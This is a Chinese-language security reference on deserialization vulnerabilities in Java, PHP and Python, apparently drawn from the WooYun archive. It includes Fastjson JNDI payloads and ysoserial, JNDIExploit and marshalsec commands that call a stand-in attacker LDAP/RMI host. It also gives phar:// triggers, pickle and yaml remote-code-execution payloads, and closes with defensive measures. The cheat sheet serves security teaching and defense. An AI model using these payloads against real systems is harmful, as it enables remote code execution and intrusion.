# Web 安全 - 反序列化漏洞

> 来源: WooYun 漏洞库 | 拆自 web-injection.md

## 五、反序列化漏洞

### 5.1 漏洞本质

```
序列化数据(不可信) -> 反序列化函数 -> 对象重构触发魔术方法/回调 -> 恶意逻辑执行
```

**核心公式**：反序列化RCE = 可控序列化输入 + 危险类在classpath/作用域内 + 可达的利用链(Gadget Chain)

### 5.2 Java反序列化

**检测标识**

```
二进制流: AC ED 00 05 (hex头部)
Base64:   rO0AB (编码后头部)
常见位置: Cookie、ViewState、JMX、RMI、T3协议、HTTP Body
```

**利用链速查**

| 利用链 | 依赖库 | 触发方式 | 工具 |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | 手工/专用工具 |
| Jackson | jackson-databind | 多态反序列化 | ysoserial |
| JNDI注入 | JDK < 8u191 | LDAP/RMI远程类加载 | JNDIExploit/marshalsec |

**Fastjson经典Payload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 缓存绕过
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**工具链**

```bash
# ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDI注入服务
java -jar JNDIExploit.jar -i attacker_ip

# marshalsec启动恶意LDAP/RMI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHP反序列化

**检测标识**

```
格式: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
关键函数: unserialize(), phar://协议触发
```

**魔术方法利用链**

| 方法 | 触发时机 | 利用方式 |
|------|----------|----------|
| `__wakeup()` | unserialize()调用时 | 属性覆盖→危险操作 |
| `__destruct()` | 对象销毁时 | 文件删除/写入/命令执行 |
| `__toString()` | 对象被当字符串使用 | 拼接进危险函数 |
| `__call()` | 调用不存在的方法 | 链式调用跳板 |

**POP链构造思路**

```
1. 找入口: __wakeup()/__destruct() 中调用$this->xxx属性的方法
2. 跳板: 通过__toString()/__call()/__get() 链接到其他类
3. 终点: 到达system()/eval()/file_put_contents()等危险函数
4. 构造: 控制属性值使链路完整连通
```

**Phar反序列化（无需unserialize调用）**

```php
// 文件操作函数触发phar://反序列化
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // 伪装为图片后缀
```

### 5.4 Python反序列化

**危险函数**

```python
import pickle, yaml, marshal

# pickle - 最常见
pickle.loads(data)      # 反序列化
pickle.load(file)       # 从文件反序列化

# yaml - 需要Loader
yaml.load(data)         # 默认不安全(旧版本)
yaml.load(data, Loader=yaml.FullLoader)  # 限制加载

# marshal - 字节码级别
marshal.loads(data)     # 加载代码对象
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# 等价手工构造:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# 或
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 防御措施

```java
// Java: ObjectInputStream白名单过滤
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: 升级组件(Fastjson/Jackson/Commons-Collections)、关闭autoType、使用白名单反序列化过滤器
- **PHP**: 避免unserialize()处理用户输入、使用json_decode替代、禁用phar://协议
- **Python**: 使用`yaml.safe_load()`替代`yaml.load()`、禁止pickle处理不可信数据、使用JSON
- **通用**: 避免原生序列化格式传输数据，统一使用JSON；对反序列化入口做签名/HMAC校验

---

